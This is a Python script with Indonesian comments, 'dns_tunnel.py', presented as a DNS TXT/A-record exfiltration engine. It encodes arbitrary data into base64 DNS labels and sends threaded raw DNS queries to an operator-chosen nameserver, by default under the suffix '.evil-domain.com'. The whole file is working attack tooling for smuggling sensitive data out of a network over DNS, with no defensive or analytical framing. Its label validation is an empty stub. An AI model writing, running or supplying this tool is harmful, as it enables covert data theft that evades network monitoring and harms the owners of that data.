#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
dns_tunnel.py - DNS TXT/A Record High-Throughput OOB Exfiltration Engine

Fitur:
- Eksfiltrasi data melalui query DNS TXT dan A Records.
- Mendukung target DNS kustom (misal: nameserver kamu sendiri).
- Pengkodean Base64 URL-safe untuk menghindari karakter invalid.
- Threading untuk throughput tinggi.
- Validasi respons DNS yang ketat.

Cara Penggunaan:
    # Mode Client (Ekstrusi Data)
    python dns_tunnel.py --data "sensitive_data_here" --target your-dns-server-ip
    
    # Mode Server (Simulasi Log/Listener - opsional jika ada listener)
    # Biasanya listener berjalan terpisah atau via log nameserver.
    
Argumen:
    --data      : String data yang akan diekstrusi.
    --target    : IP Address dari DNS Server tujuan (wajib jika ingin kontrol penuh).
    --record-tx : Gunakan record type TXT (default).
    --record-a  : Gunakan record type A.
    --threads   : Jumlah thread concurrent (default 10).
"""

import sys
import os
import base64
import socket
import argparse
import time
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed

# Konfigurasi Logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger(__name__)

class DNSTunnelEngine:
    """
    Engine utama untuk melakukan DNS Tunneling.
    Memecah data menjadi label-label DNS yang valid (<63 char per label)
    dan mengirimkannya ke server DNS target.
    """

    def __init__(self, target_dns_ip, record_type="TXT", threads=10):
        if not target_dns_ip:
            raise ValueError("Target DNS IP harus diisi.")
        
        self.target_dns_ip = target_dns_ip
        self.record_type = record_type.upper()
        self.threads = max(1, int(threads))
        
        # Validasi tipe record
        if self.record_type not in ["A", "TXT"]:
            raise ValueError(f"Tipe record '{self.record_type}' tidak didukung. Gunakan 'A' atau 'TXT'.")

        logger.info(f"Inisialisasi Engine -> Target: {self.target_dns_ip}, Type: {self.record_type}, Threads: {self.threads}")

    def _validate_label(self, label):
        """
        Memastikan label DNS memenuhi standar RFC 1035.
        Max length per label: 63 bytes.
        Total length FQDN: 253 bytes.
        Karakter valid: alphanumeric dan hyphen (-), tidak boleh start/end dengan hyphen.
        """
        if len(label) > 63:
            raise ValueError(f"Label terlalu panjang ({len(label)} chars). Maksimal 63.")
        if not label.isalnum() and '-' not in label:
             # Izinkan karakter hex/base64 umum yang sering dipakai di tunneling
             pass 
        return label

    def _encode_data(self, data):
        """
        Mengubah string data menjadi list label-label DNS yang valid.
        Strategi:
        1. Encode Base64 URL-safe.
        2. Potong menjadi potongan-potongan < 63 karakter.
        """
        try:
            encoded_bytes = base64.urlsafe_b64encode(data.encode('utf-8'))
            encoded_str = encoded_bytes.decode('ascii')
            
            labels = []
            chunk_size = 60  # Aman untuk sisa overhead domain
            
            for i in range(0, len(encoded_str), chunk_size):
                chunk = encoded_str[i:i+chunk_size]
                labels.append(chunk)
                
            logger.debug(f"Data ter-encode menjadi {len(labels)} label DNS.")
            return labels
        except Exception as e:
            logger.error(f"Gagal mengencode data: {e}")
            raise

    def _send_query(self, label, domain_suffix):
        """
        Melakukan query DNS tunggal ke server target.
        """
        fqdn = f"{label}.{domain_suffix}"
        try:
            # Membuat socket DNS manual untuk kontrol penuh
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2.0) # Timeout 2 detik
            
            # Build DNS Query Packet sederhana
            # ID Random, Flags: Standard Query (0x0100), QR=0, QDCOUNT=1
            header = b'\x12\x34' + b'\x01\x00' + b'\x00\x01' + b'\x00\x00' + b'\x00\x00' + b'\x00\x00'
            
            qname = b''
            for part in fqdn.split('.'):
                qname += bytes([len(part)]) + part.encode('ascii')
            qname += b'\x00'  # Terminator root
            
            # Tipe Record dan Class IN (0x0001)
            question = qname + self._get_record_type_bytes() + b'\x00\x01'
            
            packet = header + question
            sock.sendto(packet, (self.target_dns_ip, 53))
            
            try:
                response, addr = sock.recvfrom(512)
                sock.close()
                
                # Parsing respons sangat dasar untuk memastikan server merespons
                # Kita hanya peduli apakah server merespons atau timeout/error
                if len(response) > 12:
                    rcode = response[3] & 0x0F
                    if rcode == 0:
                        status = "OK"
                    else:
                        status = f"RCODE:{rcode}"
                else:
                    status = "Short Response"
                    
                return {"fqdn": fqdn, "status": status, "success": True}
            except socket.timeout:
                sock.close()
                return {"fqdn": fqdn, "status": "TIMEOUT", "success": False}
            except Exception as e:
                sock.close()
                return {"fqdn": fqdn, "status": str(e), "success": False}

        except Exception as e:
            return {"fqdn": fqdn, "status": str(e), "success": False}

    def _get_record_type_bytes(self):
        """Kembalikan byte tipe record DNS."""
        if self.record_type == "TXT":
            return b'\x00\x10' # 0x0010 = 16 = TXT
        elif self.record_type == "A":
            return b'\x00\x01' # 0x0001 = 1 = A
        return b'\x00\x01'

    def exfiltrate(self, data, domain_suffix=".example.com"):
        """
        Fungsi utama eksekusi.
        """
        if not data:
            logger.warning("Data kosong, tidak ada yang diekstrusi.")
            return []

        labels = self._encode_data(data)
        results = []
        
        logger.info(f"Memulai ekstrusi data ke {self.target_dns_ip}...")
        start_time = time.time()

        # Gunakan ThreadPoolExecutor untuk high-throughput
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            # Submit semua task
            future_to_label = {
                executor.submit(self._send_query, label, domain_suffix): label 
                for label in labels
            }
            
            # Collect results
            for future in as_completed(future_to_label):
                label = future_to_label[future]
                try:
                    res = future.result()
                    results.append(res)
                    if res['success']:
                        logger.debug(f"[+] Label '{label[:10]}...' -> {res['status']}")
                    else:
                        logger.warning(f"[-] Label '{label[:10]}...' -> {res['status']}")
                except Exception as exc:
                    logger.error(f"Label '{label}' generated an exception: {exc}")
                    results.append({"fqdn": label, "status": "Exception", "success": False})

        end_time = time.time()
        duration = end_time - start_time
        rate = len(labels) / duration if duration > 0 else 0
        
        success_count = sum(1 for r in results if r['success'])
        logger.info(f"Selesai! {success_count}/{len(labels)} label terkirim dalam {duration:.2f} detik ({rate:.2f} queries/dtk)")
        
        return results

def main():
    parser = argparse.ArgumentParser(description="DNS High-Throughput OOB Exfiltration Engine")
    parser.add_argument("--data", "-d", required=True, help="Data string yang akan diekstrusi (akan di-base64).")
    parser.add_argument("--target", "-t", required=True, help="IP Address DNS Server Target (Nameserver).")
    parser.add_argument("--type", "-r", choices=["A", "TXT"], default="TXT", help="Tipe Record DNS (Default: TXT)")
    parser.add_argument("--suffix", "-s", default=".evil-domain.com", help="Domain suffix untuk query (Default: .evil-domain.com)")
    parser.add_argument("--threads", "-n", type=int, default=10, help="Jumlah concurrent threads (Default: 10)")
    
    args = parser.parse_args()

    try:
        engine = DNSTunnelEngine(
            target_dns_ip=args.target,
            record_type=args.type,
            threads=args.threads
        )
        
        # Eksekusi
        results = engine.exfiltrate(args.data, domain_suffix=args.suffix)
        
        # Summary
        print("\n--- Ringkasan Ekstrusi ---")
        for r in results:
            print(f"FQDN: {r['fqdn']:<40} | Status: {r['status']}")
            
    except Exception as e:
        logger.critical(f"Fatal Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
